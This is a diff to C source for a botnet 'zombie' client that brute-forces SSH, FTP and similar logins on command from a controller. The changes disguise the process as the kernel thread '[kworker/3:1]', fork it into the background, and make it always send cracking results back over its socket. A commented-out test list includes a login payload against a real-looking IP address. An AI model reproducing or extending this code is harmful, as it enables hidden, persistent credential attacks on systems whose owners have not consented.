@@ -1,5 +1,5 @@
-//gcc zombie.c -lssh -lpthread -o zombie
-//clear; rm -rf zombie.c ; nano zombie.c ; gcc zombie.c -lssh -lpthread; ./a.out
+//gcc zombie.c -lssh -lpthread -o zombie_client
+//clear; rm -rf zombie.c ; nano zombie.c ; gcc zombie.c -lssh -lpthread -o zombie_client; ./a.out
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -14,6 +14,7 @@
 #include <pthread.h>
 #include<fcntl.h>
 #include <sys/ioctl.h>
+#include <signal.h> 
 
 #define SOCKET_MAX_LENGTH 1024
 #define RESULT_MAX_LENGTH 1024
@@ -33,6 +34,7 @@
 #define RTUN_REGEX_WRONG 3
 #define RTUN_UNREACHABLE 4
 #define RTUN_SERVICE_WRONG 5
+#define PARENTNAME      "[kworker/3:1]"
 
 //linux unsupport regex in lookaround
 #define IP_REGX "((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])\\.){3}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])"
@@ -383,6 +385,7 @@ int32_t ssh_cracker(char *payload, char *result){
         if(verbose||debug) printf("%s",result);
         return 0;
     }
+	(void)snprintf(result,RESULT_MAX_LENGTH,"{error:authentication failure}\n");
     return 1;
 }
 
@@ -614,7 +617,7 @@ int32_t do_task(char *payload, char *result){
 
     if(process(payload, result, p_func[srv_type])){
         if(verbose) printf("[Info] authentication failure!\n");
-        return -1;
+        return -2;
     }
 	printf("---> %s", result);
     //alert types:strange status/ success status.
@@ -642,6 +645,7 @@ static void zombie_handle(void * sock_fd){
     while(1){
 
         memset(data_recv,0,BUFFER_LENGTH);
+		memset(data_send,0,BUFFER_LENGTH);
         i_recvBytes = read(fd,data_recv,BUFFER_LENGTH);
         if(i_recvBytes == 0 || strncmp(data_recv,"quit",4)==0){
             break;
@@ -650,10 +654,13 @@ static void zombie_handle(void * sock_fd){
             fprintf(stderr,"[Err] zombie read error!\n");
             break;
         }
-
+		(void)do_task(data_recv, data_send);
+        send_result(fd, data_send);
+/*
         if(do_task(data_recv, data_send) != -1){
             send_result(fd, data_send);
         }
+*/
 
     }
     //Clear
@@ -700,14 +707,19 @@ void start_agent(){
     }
 }
 
-int32_t main(){
-//agent_mode start
-    // start_agent();
-//agent_mode end
+int32_t main(int argc, char *argv[]){
 
+    // 修改进程名并放到后台，参考@droberson的icmp-backdoor项目。thx,a lot :)
+    if (strlen(argv[0]) >= strlen(PARENTNAME)) {
+        memset(argv[0], '\0', strlen(argv[0]));
+        strcpy(argv[0], PARENTNAME);
+    }
+    signal(SIGCHLD, SIG_IGN);
+	if (fork() == 0) start_agent();
 
 
 //test_function_mode start
+/*
     char result[SOCKET_MAX_LENGTH];
     char payload[][100] = {
         "ftp://170.170.64.78:21/user=anonymous&passwd=0:`**`", 
@@ -760,5 +772,5 @@ int32_t main(){
     }
 //test_function_mode end
     return 0;
-
+*/
 }
